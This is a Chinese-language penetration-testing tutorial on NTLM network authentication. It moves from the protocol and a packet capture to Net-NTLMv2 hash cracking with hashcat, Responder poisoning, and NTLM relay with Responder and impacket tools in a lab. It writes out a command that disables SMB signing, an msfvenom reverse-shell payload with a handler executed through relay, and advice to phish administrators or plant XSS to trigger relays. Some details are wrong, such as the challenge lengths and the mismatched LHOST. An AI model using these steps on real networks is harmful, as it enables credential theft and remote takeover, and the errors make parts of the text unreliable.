# NTML网络认证

Windows认证分为本地认证和网络认证，当我们开机登录用户账户时，就需要将lsass.exe进程转换的明文密码hash与
sam文件进行比对，这种方式即为——本地认证

而当我们访问同一局域网的一台主机上的SMB共享时，需要提供凭证通过验证才能访问，这个过程就会设计windows的网络认证。

## NTLM协议

NTLM协议的认证共需要三个步骤完成：协商、挑战、认证。也叫 **挑战响应机制**

  * 协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。版本主要分为两种：NTLMv1与NTLM v2
  * 挑战，下面会介绍。
  * 验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源

### NTLMv1、NTLM v2区别

**不同点**

  * NTLM v1的Challenge有8位，NTLM v2的Challenge为16位
  * NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。

**共同点**

  * 都是通过NTLM Hash进行的加密

### 挑战的完整过程

![](./img/5708284253323935477.png)

#### **工作组中**

  1. client向server发送用户信息(即用户名)请求
  2. server接受到请求后，判断本地用户列表是否存在client发送的用户名，如果没有返回认证失败，如果有，生成一个16位的随机数即Challenge， 然后使用登录用户名对应的NTLM Hash加密Challenge， 生成Challenge1保存在内存中。同时，生成Challenge1后，将Challenge发送给client。
  3. 当client接收到Chalenge时，将发送的用户名所对应的NTLM hash对Chalenge进行加密即Response（NET-NTLM-Hash），并Response发送给server。
  4. 接着就是验证过程了，server在收到Response后，将其与Chalenge1进行比对，如果相同，则验证成功

#### 域环境中

  1. 由于域机器SAM文件中不存在域用户的NTLM hash，所以服务器将客户端用户名、Challenge、response通过 Netlogon协议交到域控手中，让域控对其进行身份验证。
  2. 域控通过客户端用户名在自己的ntds.dit中找到对应的NTLM-Hash，用Challenge对其进行加密，再与NET-NTLM-Hash进行对比。如果相同则表示用户拥有的密码是正确的，否则则验证失败，DC将结果返回给服务器。
  3. 服务器根据DC的结果成功与否返回给客户端。

### wirshark抓包分析

1、模拟client访问server的共享

![](./img/2859327222590799777.png)  
2、抓包看下共享产生的SMB协议，其中Negotiate Protocol Responss就是进行协商的过程

![](./img/5796419845585137226.png)  
3、服务器向客户端返回16位长的challenge

![](./img/4922027873032766224.png)  
4、接着客户端将发送的用户名所对应的NTLM hash对Chalenge进行加密得到Response

![](./img/321184271911457406.png)  
5、将获取到的Response进行Net-NTLMhash格式的拼接

Net-NTLMhash格式：

    
    
    username::domain:challenge:HMAC-MD5:blob
    

username、domain即为：

challenge就是第二步中获取的内容：

    
    
    7f3085e50542ee4d
    

HMAC-MD5即为NTProofStr的内容：

![](./img/1962827676156019446.png)  
blob就是Response中除NTProofStr剩下的部分：

    
    
    01010000000000005da4077f4b10d901d3c521d6bddc4ce50000000002001200530045004e00540049004d0045004e00540001001000570049004e00300038002d005000430004001a00730065006e00740069006d0065006e0074002e0063006f006d0003002c00570069006e00300038002d00700063002e00730065006e00740069006d0065006e0074002e0063006f006d0005001a00730065006e00740069006d0065006e0074002e0063006f006d00070008005da4077f4b10d901060004000200000008003000300000000000000000000000002000003b6ad2d6ec858ee23b79e3ddde29d57c3479fca6042d38c984b242c2b44d1e7f0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00350032002e00310037003100000000000000000000000000
    

所以拼接好的Net-NTLMhash为：

    
    
    test::SENTIMENT:7f3085e50542ee4d:4d11723d0631436ee007f9bdb1ce3a45:01010000000000005da4077f4b10d901d3c521d6bddc4ce50000000002001200530045004e00540049004d0045004e00540001001000570049004e00300038002d005000430004001a00730065006e00740069006d0065006e0074002e0063006f006d0003002c00570069006e00300038002d00700063002e00730065006e00740069006d0065006e0074002e0063006f006d0005001a00730065006e00740069006d0065006e0074002e0063006f006d00070008005da4077f4b10d901060004000200000008003000300000000000000000000000002000003b6ad2d6ec858ee23b79e3ddde29d57c3479fca6042d38c984b242c2b44d1e7f0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00350032002e00310037003100000000000000000000000000
    

# 通过Net-NTLMhash破解密码

## hashcat爆破

  * -m：hash的类型，5600对应NetNTLMv2，具体可参考：<https://hashcat.net/wiki/doku.php>
  * -o：输出文件
  * 字典文件为password.txt
  * \--force 强制执行，测试系统不支持Intel OpenCL

    
    
    hashcat -m 5600 test::SENTIMENT:7f3085e50542ee4d:4d11723d0631436ee007f9bdb1ce3a45:01010000000000005da4077f4b10d901d3c521d6bddc4ce50000000002001200530045004e00540049004d0045004e00540001001000570049004e00300038002d005000430004001a00730065006e00740069006d0065006e0074002e0063006f006d0003002c00570069006e00300038002d00700063002e00730065006e00740069006d0065006e0074002e0063006f006d0005001a00730065006e00740069006d0065006e0074002e0063006f006d00070008005da4077f4b10d901060004000200000008003000300000000000000000000000002000003b6ad2d6ec858ee23b79e3ddde29d57c3479fca6042d38c984b242c2b44d1e7f0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00350032002e00310037003100000000000000000000000000 password.txt -o result.txt --force
    

![](./img/1192275428201970135.png)

## Responder

下载地址：<https://github.com/lgandx/Responder，kali自带在`/usr/share/responder`下，但有的时候不一定哪个好用，所以可以下载下来以备不时之需>

### 前置知识

**Windows系统名称解析顺序**  
当我们访问一个共享时 net use \aaa，其寻找这个主机名称会遵循以下的步骤：

  1. 本地hosts文件（%windir%\System32\drivers\etc\hosts）
  2. DNS缓存/DNS服务器
  3. 链路本地多播名称解析（LLMNR）和NetBIOS名称服务（NBT-NS）

如果没有在1、2项中找到对应名称，系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络
上的任何机器响应并声称是这台机器。

因此当用户输入不存在、包含错误或者DNS中
没有的主机名时，通过Responder工具监听LLMNR和NetBIOS广播，就可以伪装成受害者要访问的这台机器，并从而让受害者交出相应的登陆凭证。核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLM Hash。

### 获取Net-NTLMhash

监听kali的eth1网卡

    
    
    sudo responder -I eth1 -fv
    

同网段主机访问任意不存在用户

![](./img/8602937677394285202.png)  
本地和缓存查询不到sfss时，内网主机就会将未经认证的UDP广播到网络中，询问谁是sfss，由于该过程未被认证，并且广播到整个网络，从而允许网络
上的任何机器响应并声称自己是sfss。此时kali伪装成sfss这台机器，接着进行ntlm认证。从而让受害者交出相应的登陆凭证(Net-NTLMhash)

![](./img/7033573800921821487.png)  
之后就可以用hashcat进行爆破了

# NTLM-Relay攻击

上边获取到Net-NTLMhash后对密码进行了爆破，但若我们爆破不出密码呢？这时就可以使用NTLM-relay攻击，也叫NTLM重放攻击。

## 原理

![](./img/2243086592735471093.png)  
重放本身的含义就是：攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。

因此NTLM重放攻击也就是将窃听到的客户端`Net-NTLMhash`，重放到服务端。而由于攻击者拥有了该凭证，因此服务端自然而然就认为攻击者就是客户端。如果这个凭据权限足够，那么就可以控制域内其它主机，所以凭据的权限很重要。这里攻击者其实就充当了一个中间人的身份。

## Responder

**攻击前提**

NTLM Relay攻击时在域中通过relay到smb服务将管理组成员冲放到到一些敏感的机器上。

因此relay到smb服务要求 **被攻击机器不能开启SMB签名** ，域内主机的 SMB 签名默认关闭，但域控是默认开启的。

**实验环境**

虚拟机 | IP  
---|---  
kali | 192.168.52.199  
Win2012(域控) | 192.168.52.163  
Win2016(域管理员登录) | 192.168.52.198  
Win2008(受害机) | 192.168.52.171  
  
1、先用RunFinger.py来查看下内网中开放的信息，可以看到163域控是开启了smb签名的，其他主机没有

    
    
    python RunFinger.py -i 192.168.52.0/24
    

![](./img/8501010598370458164.png)  
若域内其他主机开启了SMB Signing，可通过命令关闭对应服务( Windows
Server系列中RequireSecuritySignature子键默认值为1)

    
    
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f
    

2、修改responder的配置文件Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off：

    
    
    sudo vim /usr/share/responder/Responder.conf
    

![](./img/7470142765365338874.png)  
3、开启responder监听

    
    
    responder -I eth1
    

4、启动MultiRelay.py

    
    
    cd /usr/share/responder/tools
    python3 MultiRelay.py -t  要攻击的域内目标  -u ALL
    python3 MultiRelay.py -t 192.168.52.171 -u ALL
    

5、由于需要高权限凭证，因此在WIN16上用域管理员权限登录

![](./img/34353610748388523.png)  
6、返回了win08的shell

![](./img/1452787795725713502.png)

## impacket

impacket也有对应的exp

### smbrelayx.py

1、在kali上执行如下命令监听 80 和 445 端口，伪造 http 和 smb 服务：

    
    
    #SMBRelay 攻击 192.168.52.171 主机，并执行 whoami 命令
    python3 smbrelayx.py -h 192.168.52.171 -c whoami
    

2、通过owa钓鱼或者其他手段诱导域管理员或其它拥有域管账号密码的域用户访问访问 <http://192.168.52.199> ：

![](./img/5440999529235154776.png)  
3、这时就成功执行whoami命令，获取到了win08的system权限

![](./img/7186614965095698286.png)  
4、利用该思路可以尝试上线到C2，先生成一个木马

    
    
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.163 LPORT=4444 -f exe -o shell.exe
    #启动监听
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 192.168.52.199
    set lport 4444
    run
    

5、smbrelayx.py开始重放攻击,-e是要执行的文件

    
    
    python3 smbrelayx.py -h 192.168.52.171 -e shell.exe
    

6、重复步骤2的操作，成功返回会话

![](./img/3287050304781972073.png)  
7、但该会话很快就会被删除

![](./img/5536310600850444030.png)  
因此应尽快做好进程迁移

    
    
    run post/windows/manage/migrate
    

### ntlmrelayx.py

与上述方式一样还可以用`ntlmrelayx.py`

    
    
    python3 ntlmrelayx.py -t smb://192.168.52.171 -c whoami
    

除邮件钓鱼外，通过共享也可

![](./img/1833436939280737471.png)

## 扩展

其实相对于impacket中的方法，Reponder的更实用一些，因为impacket中的方法需要连接kali，在实战中有些鸡肋。。。

而Reponder中，直接通过`net use`的一个不存在用户的方法，也不太会发生，因此可以通过另一种方式让目标机器加载`net use`

因为在渗透前一定是拿到了一定权限的，那就可以通过在目标index界面中插入一条xss语句，当有管理员身份的用户访问时，便可触发重放攻击

![](./img/9052409919500121720.png)

